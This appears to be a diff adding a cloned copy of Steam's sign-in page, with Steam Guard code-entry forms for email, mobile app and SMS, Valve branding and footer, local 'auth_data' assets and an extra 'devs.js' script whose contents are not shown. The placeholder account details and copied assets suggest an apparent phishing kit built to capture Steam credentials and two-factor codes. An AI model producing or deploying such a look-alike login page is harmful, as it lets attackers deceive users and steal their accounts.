+													<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 2px;">
+														<div class="_1Mcy9wnDnt1Q72FijsNtHC">&nbsp;</div>
+														<div class="_3PDBFJ_verUpV38hX7qRqL Panel Focusable">
+															<input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+														</div>
+													</div>
+													<div class="_2pVTWbvwlXTiDFQQmjzaWx" style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;">
+														<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4">
+															<div>
+																<div class="_1-D_t_uFpOQOPGHFq5pnBy">
+																	Enter the code from your email address
+																	at: <span class="_2zLvbA_n_COSEuC8TJ7kpe"></span>
+																</div>
+															</div>
+														</div><svg viewBox="0 0 58 56" fill="none" class="_3iM5Lu2fXW8xq2MEk30GP0">
+															<path d="M57.9352 24.5887C57.8463 24.233 57.8463 23.8774 57.6684 23.5217C57.4017 22.8993 57.046 22.4547 56.5125 22.0101L49.577 16.4083V10.9844C49.577 8.85041 47.8876 7.16098 45.7536 7.16098H38.1956L31.5269 1.73706C30.1042 0.581137 28.0591 0.581137 26.6364 1.73706L19.9677 7.16098H12.4097C10.2757 7.16098 8.58631 8.93932 8.58631 10.9844V16.4083L1.56188 22.0101C1.02838 22.3658 0.672713 22.8993 0.405962 23.5217V23.6106C0.228128 24.1441 0.050293 24.5887 0.050293 25.1222V52.1529C0.050293 53.2199 0.494878 54.1091 1.1173 54.8204C1.82863 55.5318 2.80672 55.8874 3.7848 55.8874H54.0228C55.0898 55.8874 55.979 55.4428 56.6903 54.8204C57.4017 54.1091 57.7573 53.131 57.7573 52.1529V25.1222C57.9352 24.8554 57.9352 24.7665 57.9352 24.5887ZM49.577 19.7872L54.7342 23.9663L49.577 28.9456V19.7872ZM28.148 3.60431C28.4148 3.42648 28.6815 3.24864 28.9483 3.24864C29.3039 3.24864 29.5707 3.33756 29.7485 3.60431L34.0165 7.07207H23.9689L28.148 3.60431ZM10.9871 10.9844C10.9871 10.2731 11.5206 9.73958 12.2319 9.73958H45.6646C46.376 9.73958 46.9095 10.362 46.9095 10.9844V31.4353L46.8206 31.5242L40.2407 37.9262H17.6558L11.076 31.5242L10.9871 31.4353V10.9844ZM8.40848 19.7872V28.9456L3.34022 23.9663L8.40848 19.7872ZM2.62888 51.6194V26.9005L15.2551 39.26L2.62888 51.6194ZM4.49614 53.3088L17.6558 40.5048H40.2407L53.4004 53.3088H4.49614ZM55.3566 51.6194L42.6415 39.1711L55.2677 26.8116V51.6194H55.3566ZM29.0372 35.3476C30.5488 35.3476 31.9715 35.0809 33.3941 34.5474C34.0165 34.2806 34.3722 33.4804 34.1055 32.858C33.8387 32.2355 33.0385 31.8799 32.416 32.1466C31.349 32.5912 30.1931 32.769 29.0372 32.769C27.3478 32.769 25.7473 32.3245 24.4135 31.5242C21.746 29.9237 20.0566 27.0784 20.0566 23.7884C20.0566 18.8091 24.0579 14.8078 29.0372 14.8078C34.0165 14.8078 38.0178 18.8091 38.0178 23.7884V24.4109C38.0178 25.4779 37.2175 26.367 36.0616 26.367C34.9946 26.367 34.1055 25.4779 34.1055 24.4109V23.7884C34.1055 20.9431 31.7936 18.6313 28.9483 18.6313C26.1029 18.6313 23.7911 20.9431 23.7911 23.7884C23.7911 26.6338 26.1029 28.9456 28.9483 28.9456C30.3709 28.9456 31.7047 28.3232 32.5939 27.434C33.3941 28.4121 34.639 28.9456 35.9727 28.9456C38.4624 28.9456 40.5075 26.9894 40.5075 24.4109V23.7884C40.5075 17.3864 35.2614 12.2292 28.9483 12.2292C22.6352 12.2292 17.3891 17.4753 17.3891 23.7884C17.3891 26.7227 18.545 29.4791 20.3233 31.5242C22.5463 33.925 25.5694 35.3476 29.0372 35.3476ZM29.0372 26.367C27.6145 26.367 26.4586 25.2111 26.4586 23.7884C26.4586 22.3658 27.6145 21.2098 29.0372 21.2098C30.4599 21.2098 31.6158 22.3658 31.6158 23.7884C31.5269 25.2111 30.371 26.367 29.0372 26.367Z" fill="#1A99FF"></path>
+														</svg>
+													</div>
+												</div><a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ" href="https://help.steampowered.com/wizard/HelpWithSteamGuardCode" target="_blank">Help,
+													I no longer have access to the
+													email address for this account</a>
+											</div>
+										</form>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="two-factor-confirmation" style="display: none;">
+										<div class="_1mhmmseSBKL7v66ts9ZWnR" style="gap: 40px;">
+											<div class="_1aop9IbW-LIaCIp7vIQtRv">
+												<div class="_2SE9Zaci337LtSMV5BSDLv">Account:
+													<span class="_3Vjp0pUGUYHydAeWOp6s7z">username</span>
+												</div>
+												<div class="QApnTTqEcicVcDQujTXyf">You have a mobile
+													authenticator protecting this account.</div>
+											</div>
+											<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4">
+												<div class="_2aZnkWTSFPjLRtK8qc_lgB"><img src="auth_data/login_mobile_auth.png">
+													<div class="_7LmnTPGNvHEfRVizEiGEV">Use the
+														Steam Mobile App to confirm your sign in...</div>
+												</div>
+											</div>
+											<div class="_3yJHpfmxkJQlkF3PnJudn8">
+												<div class="_37AOBhbGO2zDY2TNLGB1ov">
+													<div id="enter-code" class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ">
+														Enter a code instead</div>
+												</div><a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ" href="https://help.steampowered.com/wizard/HelpWithLoginInfo?lost=8&amp;issueid=402">Help,
+													I no longer have access to my Steam Mobile App</a>
+											</div>
+										</div>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="mobile" style="display: none">
+										<form>
+											<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 14px;">
+												<div class="_1aop9IbW-LIaCIp7vIQtRv">
+													<div class="_2SE9Zaci337LtSMV5BSDLv">A verification code was sent
+														to phone number ending in <span class="_3Vjp0pUGUYHydAeWOp6s7z">'00'</span>
+													</div>
+													<div class="QApnTTqEcicVcDQujTXyf">You have a mobile
+														phone number protecting this account.
+													</div>
+												</div>
+												<div class="_2AnqSZicq50gXaJuQx-SdC">
+													<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 2px;">
+														<div class="_1Mcy9wnDnt1Q72FijsNtHC">&nbsp;</div>
+														<div class="_3PDBFJ_verUpV38hX7qRqL Panel Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+														</div>
+													</div>
+													<div class="T68fBH-D1OAOP-cwGq1V" style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;">
+														<div class="_1RruwDw8_Q_Fi6hZEV0Pzv">Enter the
+															account verification code you received
+														</div><svg viewBox="0 0 33 49" fill="currentColor" class="_2hLC_cxC9LeV1y57BuX8lm">
+															<path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z">
+															</path>
+															<path fill="currentColor" d="M22.2456 22.4164C22.2456 21.6666 22.8127 21.0002 23.6228 21.0002C24.3519 21.0002 25 21.6666 25 22.4164C25 23.1661 24.3519 23.8325 23.6228 23.8325C22.8937 23.8325 22.2456 23.1661 22.2456 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M18.6812 22.4164C18.6812 21.6666 19.2483 21.0002 20.0584 21.0002C20.8685 21.0002 21.5166 21.6666 21.4355 22.4164C21.4355 23.1661 20.8685 23.8325 20.0584 23.8325C19.3293 23.8325 18.6812 23.1661 18.6812 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M15.1977 22.4164C15.1977 21.6666 15.7648 21.0002 16.5749 21.0002C17.304 21.0002 17.9521 21.6666 17.9521 22.4164C17.9521 23.1661 17.385 23.8325 16.5749 23.8325C15.8458 23.8325 15.1977 23.1661 15.1977 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M11.7143 22.4164C11.7143 21.6666 12.2814 21.0002 13.0915 21.0002C13.8206 21.0002 14.4686 21.6666 14.4686 22.4164C14.4686 23.1661 13.9016 23.8325 13.0915 23.8325C12.3624 23.8325 11.7143 23.1661 11.7143 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M8.14983 22.4164C8.14983 21.6666 8.7169 21.0002 9.527 21.0002C10.3371 21.0002 10.9852 21.6666 10.9042 22.4164C10.9042 23.1661 10.3371 23.8325 9.527 23.8325C8.79791 23.8325 8.14983 23.1661 8.14983 22.4164Z">
+															</path>
+														</svg>
+													</div>
+												</div>
+												<a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ">It
+													could take up to 5 minutes for an account verification code to be
+													delivered.</a>
+											</div>
+										</form>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="email-code" style="display: none;">
+										<form>
+											<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 14px;">
+												<div class="_1aop9IbW-LIaCIp7vIQtRv">
+													<div class="_2SE9Zaci337LtSMV5BSDLv">A verification code was sent
+														to
+														<span class="_3Vjp0pUGUYHydAeWOp6s7z">email@domain.com</span>
+													</div>
+													<div class="QApnTTqEcicVcDQujTXyf">Your email address
+														requires to be verified.
+													</div>
+												</div>
+												<div class="_2AnqSZicq50gXaJuQx-SdC">
+													<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 2px;">
+														<div class="_1Mcy9wnDnt1Q72FijsNtHC">&nbsp;</div>
+														<div class="_3PDBFJ_verUpV38hX7qRqL Panel Focusable">
+															<input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable"><input type="text" maxlength="1" autocomplete="none" tabindex="0" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+														</div>
+													</div>
+													<div class="_2pVTWbvwlXTiDFQQmjzaWx" style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;">
+														<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4">
+															<div>
+																<div class="_1-D_t_uFpOQOPGHFq5pnBy">
+																	Enter the new code from your email address
+																</div>
+															</div>
+														</div><svg viewBox="0 0 58 56" fill="none" class="_3iM5Lu2fXW8xq2MEk30GP0">
+															<path d="M57.9352 24.5887C57.8463 24.233 57.8463 23.8774 57.6684 23.5217C57.4017 22.8993 57.046 22.4547 56.5125 22.0101L49.577 16.4083V10.9844C49.577 8.85041 47.8876 7.16098 45.7536 7.16098H38.1956L31.5269 1.73706C30.1042 0.581137 28.0591 0.581137 26.6364 1.73706L19.9677 7.16098H12.4097C10.2757 7.16098 8.58631 8.93932 8.58631 10.9844V16.4083L1.56188 22.0101C1.02838 22.3658 0.672713 22.8993 0.405962 23.5217V23.6106C0.228128 24.1441 0.050293 24.5887 0.050293 25.1222V52.1529C0.050293 53.2199 0.494878 54.1091 1.1173 54.8204C1.82863 55.5318 2.80672 55.8874 3.7848 55.8874H54.0228C55.0898 55.8874 55.979 55.4428 56.6903 54.8204C57.4017 54.1091 57.7573 53.131 57.7573 52.1529V25.1222C57.9352 24.8554 57.9352 24.7665 57.9352 24.5887ZM49.577 19.7872L54.7342 23.9663L49.577 28.9456V19.7872ZM28.148 3.60431C28.4148 3.42648 28.6815 3.24864 28.9483 3.24864C29.3039 3.24864 29.5707 3.33756 29.7485 3.60431L34.0165 7.07207H23.9689L28.148 3.60431ZM10.9871 10.9844C10.9871 10.2731 11.5206 9.73958 12.2319 9.73958H45.6646C46.376 9.73958 46.9095 10.362 46.9095 10.9844V31.4353L46.8206 31.5242L40.2407 37.9262H17.6558L11.076 31.5242L10.9871 31.4353V10.9844ZM8.40848 19.7872V28.9456L3.34022 23.9663L8.40848 19.7872ZM2.62888 51.6194V26.9005L15.2551 39.26L2.62888 51.6194ZM4.49614 53.3088L17.6558 40.5048H40.2407L53.4004 53.3088H4.49614ZM55.3566 51.6194L42.6415 39.1711L55.2677 26.8116V51.6194H55.3566ZM29.0372 35.3476C30.5488 35.3476 31.9715 35.0809 33.3941 34.5474C34.0165 34.2806 34.3722 33.4804 34.1055 32.858C33.8387 32.2355 33.0385 31.8799 32.416 32.1466C31.349 32.5912 30.1931 32.769 29.0372 32.769C27.3478 32.769 25.7473 32.3245 24.4135 31.5242C21.746 29.9237 20.0566 27.0784 20.0566 23.7884C20.0566 18.8091 24.0579 14.8078 29.0372 14.8078C34.0165 14.8078 38.0178 18.8091 38.0178 23.7884V24.4109C38.0178 25.4779 37.2175 26.367 36.0616 26.367C34.9946 26.367 34.1055 25.4779 34.1055 24.4109V23.7884C34.1055 20.9431 31.7936 18.6313 28.9483 18.6313C26.1029 18.6313 23.7911 20.9431 23.7911 23.7884C23.7911 26.6338 26.1029 28.9456 28.9483 28.9456C30.3709 28.9456 31.7047 28.3232 32.5939 27.434C33.3941 28.4121 34.639 28.9456 35.9727 28.9456C38.4624 28.9456 40.5075 26.9894 40.5075 24.4109V23.7884C40.5075 17.3864 35.2614 12.2292 28.9483 12.2292C22.6352 12.2292 17.3891 17.4753 17.3891 23.7884C17.3891 26.7227 18.545 29.4791 20.3233 31.5242C22.5463 33.925 25.5694 35.3476 29.0372 35.3476ZM29.0372 26.367C27.6145 26.367 26.4586 25.2111 26.4586 23.7884C26.4586 22.3658 27.6145 21.2098 29.0372 21.2098C30.4599 21.2098 31.6158 22.3658 31.6158 23.7884C31.5269 25.2111 30.371 26.367 29.0372 26.367Z" fill="#1A99FF"></path>
+														</svg>
+													</div>
+												</div> <a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ">It
+													could take up to 5 minutes for an account verification code to be
+													delivered.</a>
+											</div>
+										</form>
+									</div>
+
+								</div>
+							</div>
+						</div>
+						<div class="login_bottom_row">
+							<div class="login_btn_ctn login_bottom_row_item">
+								<div class="headline">New to Steam?</div>
+								<a target="_top" href="https://store.steampowered.com/join" class="login_create_btn btn_blue_steamui btn_medium">
+									<span>Create an account</span>
+								</a>
+							</div>
+							<div class="login_bottom_row_item">
+								<div class="subtext">It's free and easy. Discover thousands of games to play with
+									millions of new friends. <a class="login_join_desc about_link" href="https://store.steampowered.com/about">Learn more about Steam</a>
+								</div>
+							</div>
+
+						</div>
+					</div> <!-- responsive_page_legacy_content -->
+
+					<div id="footer_spacer" class=""></div>
+					<div id="footer_responsive_optin_spacer"></div>
+					<div id="footer">
+						<div class="footer_content">
+							<span id="footerLogo"><img src="auth_data/footerLogo_valve.png" width="96" height="26" border="0" alt="Valve Logo"></span>
+							<span id="footerText">
+								© Valve Corporation. All rights reserved. All trademarks are property of their
+								respective
+								owners
+								in the US and other countries.<br>Some geospatial data on this website is provided by <a href="https://steamcommunity.com/linkfilter/?url=http://www.geonames.org" target="_blank" rel=" noopener">geonames.org</a>. <br>
+								<span class="valve_links">
+									<a href="http://store.steampowered.com/privacy_agreement/" target="_blank">Privacy
+										Policy</a>
+									&nbsp; | &nbsp;<a href="https://store.steampowered.com/legal/" target="_blank">Legal</a>
+									&nbsp;| &nbsp;<a href="http://store.steampowered.com/subscriber_agreement/" target="_blank">Steam Subscriber Agreement</a>
+									&nbsp;| &nbsp;<a href="http://store.steampowered.com/account/cookiepreferences/" target="_blank">Cookies</a>
+								</span>
+							</span>
+						</div>
+						<div class="responsive_optin_link">
+							<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
+								<span>View mobile website</span>
+							</div>
+						</div>
+					</div>
+
+				</div> <!-- responsive_page_content -->
+
+			</div> <!-- responsive_page_frame -->
+
+			<div class="miniprofile_hover" style="display: none;">
+				<div class="shadow_ul"></div>
+				<div class="shadow_top"></div>
+				<div class="shadow_ur"></div>
+				<div class="shadow_left"></div>
+				<div class="shadow_right"></div>
+				<div class="shadow_bl"></div>
+				<div class="shadow_bottom"></div>
+				<div class="shadow_br"></div>
+				<div class="miniprofile_hover_inner shadow_content"></div>
+			</div>
+
+			<script type="text/javascript" src="auth_data/login_002.js"></script>
+			<script type="text/javascript" src="devs.js"></script>
+
+
+</div></div></body></html>
